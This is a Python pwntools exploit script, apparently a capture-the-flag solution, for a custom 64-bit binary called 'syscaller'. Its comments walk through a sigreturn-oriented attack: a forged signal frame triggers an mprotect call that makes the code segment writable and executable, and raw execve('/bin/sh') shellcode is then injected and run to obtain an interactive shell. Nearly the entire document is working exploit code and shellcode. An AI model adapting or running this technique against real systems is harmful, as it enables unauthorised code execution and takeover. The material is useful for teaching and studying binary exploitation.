import pwn
import struct

# syscaller is a 64-bit statically linked custom (written in plain asm) binary
# ASLR is turned on. The binary does not have any of the other typical protections because it is custom asm

# This binary gives us control of r12,r11,rdi,rax,rbx,rdx,rsi,rdi and makes a syscall on our behalf with what we put in those registers
# We take control of execution by making a sig return (rax = 0x0f) syscall
# The problem becomes that we cannot write shellcode or /bin/sh to memory because all of the memory segments of the binary, except for the stack are not writeable
# We cannot write to the stack, because ASLR is turned on, so we do not know it's addresses

# The solution is to setup a mprotect syscall to change the permissions on the instruction portion of memory to writeable
# This allows us to write execve('/bin/sh') shellcode to instruction memory and then execute those instructions

target = pwn.process("./syscaller")
# pwn.gdb.attach(target, gdbscript="b *0x4000ff")

pwn.context.arch = "amd64"

################################################
#### mprotect syscall via sigreturn syscall ####
################################################

# The only writeable memory region is the stack
# We want to write shellcode somewhere in memory at a known address
# The base address of the stack is unknown because of ASLR

# We can remap the binary segment, (0x400000 - 0x401000) (this is the instruction memory) to rwx permissions
# We use an mprotect syscall:
# rax: 0xa (mprotect syscall)
# rdi: 0x400000 (start of the data segment to remap)
# rsi: 0x1000 (length of the chunk)
# rdx: 0x7 (standard unix permission for read, write, execute)

frame = pwn.SigreturnFrame()
frame.rip = 0x400104 # address of the syscall before read(0x200)
frame.rax = 0xa
frame.rdi = 0x400000
frame.rsi = 0x1000
frame.rdx = 0x7
frame.rsp = 0x40011a # address of the pop r12 instruction -> This is where the next read() is going to write to

# The binary pops r12, r11, rdi, rax, rbx, rdx, rsi, rdi for us
# The only value of these that matters is rax, because sigreturn syscall gets
# sigreturn frame from what is on top of the stack
payload = b''
payload += struct.pack("<Q", 0x0) # r12 -> doesn't matter
payload += struct.pack("<Q", 0x0) # r11 -> doesn't matter
payload += struct.pack("<Q", 0x0) # rdi -> doesn't matter
payload += struct.pack("<Q", 0xf) # rax -> 0x0f for sigreturn syscall
payload += struct.pack("<Q", 0x0) # rbx -> doesn't matter
payload += struct.pack("<Q", 0x0) # rdx -> doesn't matter
payload += struct.pack("<Q", 0x0) # rsi -> doesn't matter
payload += struct.pack("<Q", 0x0) # rdi again -> doesn't matter

payload += bytes(frame)

payload += b'0' * ((0x200 - 1) - len(payload)) # This is neccesary, otherwise that read(0x200) call will shave off part of our shellcode input later

target.sendline(payload)

#################################################
#### Writing Shellcode to Instruction Memory ####
#################################################

# After we send the mprotect payload, we will be back at 0x400106 which is where the binary performs a read syscall
# We put 0x0040011a in rsp, the binary performs a mov rsi, rsp instruction before the read syscall, so that is where our payload will be written to
# Because we used the syscall at 0x400118 for our sigreturn, 0x0040011a is also the next instruction which will be executed

# Therefore we can send execve(/bin/sh) shellcode, and it will be written to 0x0040011a which is about to be executed
# This is the shellcode from shellcode.asm in this directory
shellcode = b'\x48\xbf\x2f\x62\x69\x6e\x2f\x73\x68\xff\x48\xc1\xe7\x08\x48\xc1\xef\x08\x57\x54\x5f\x48\x31\xc0\xb0\x3b\x48\x31\xf6\x48\x31\xd2\x0f\x05'

target.sendline(shellcode)

target.interactive()


